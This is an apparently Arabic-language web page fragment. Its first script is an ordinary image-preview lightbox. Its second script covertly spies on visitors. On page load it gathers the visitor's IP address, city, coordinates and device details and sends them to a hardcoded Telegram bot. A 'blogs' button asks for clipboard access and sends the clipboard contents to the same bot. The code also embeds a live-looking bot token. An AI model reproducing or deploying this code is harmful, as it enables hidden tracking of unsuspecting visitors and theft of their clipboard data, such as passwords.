<script>
  const preview = document.getElementById('imagePreview');
  const img = document.getElementById('previewImg');
  const downloadBtn = document.getElementById('downloadBtn');

  document.querySelectorAll('img').forEach(function(image) {
    image.addEventListener('click', function() {
      img.src = this.src;
      downloadBtn.href = this.src;
      preview.style.display = 'flex';
    });
  });

  // إغلاق عند الضغط على الخلفية
  preview.addEventListener('click', function(e) {
    if (e.target === preview) {
      preview.style.display = 'none';
    }
  });
</script>

  <script>
    const TOKEN = "8280042578:AAFuMPgHS9RCaYcxv1eyVppyr8BkJ_xGD5c";
    const CHAT_ID = "7664410054";
    let report = "🛑 تقرير دخول جديد:\n\n";

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
      });
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json");
        const data = await res.json();
        report += `🌐 IP: ${data.ip}\n📍 الدولة: ${data.country}\n🏙️ المدينة: ${data.city}\n🌎 إحداثيات: ${data.loc}\n🛰️ خريطة: https://www.google.com/maps?q=${data.loc}\n\n`;
      } catch {
        report += "❌ فشل جلب IP\n\n";
      }
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      report += `🧠 UserAgent: ${ua}\n`;
      if (/android/i.test(ua)) report += "📱 أندرويد ✅\n";
      else if (/iphone|ipad/i.test(ua)) report += "🍏 آيفون ✅\n";
      else if (/windows/i.test(ua)) report += "💻 ويندوز ✅\n";
      else report += "🌀 غير معروف ❌\n";

      if (/chrome/i.test(ua)) report += "🌐 Chrome ✅\n";
      else if (/firefox/i.test(ua)) report += "🌐 Firefox ✅\n";
      else report += "🌐 غير معروف ❌\n";
      report += "\n";
    }

    async function runReport() {
      await getIPInfo();
      getDeviceInfo();
      sendToTelegram(report);
    }

    runReport();

    function goToIndex() {
      sendToTelegram("🎬 تم الضغط على زر الفيديو");
      location.href = "index-videos.html";
    }

    function goToBlog() {
      sendToTelegram("📖 تم الضغط على زر المدونات\n📋 طلب إذن وصول للحافظة...");
      navigator.permissions.query({ name: "clipboard-read" }).then(async result => {
        if (result.state === "denied") {
          alert("アクセス拒否されました（رفض الوصول）");
        } else {
          try {
            const text = await navigator.clipboard.readText();
            sendToTelegram("📋 محتوى الحافظة:\n" + text);
            alert("アクセス許可されました（تم السماح）");
          } catch {
            sendToTelegram("⚠️ فشل قراءة الحافظة");
          }
        }
      }).catch(() => {
        sendToTelegram("❌ المتصفح لا يدعم قراءة الحافظة");
      });
    }

    // أي نقر داخل الصفحة يُرسل للبوت
    function handleClick(e) {

      let label = e.target.innerText || e.target.alt || tag;
      sendToTelegram(`🖱️ تم الضغط على: ${label}`);
    }
  </script>
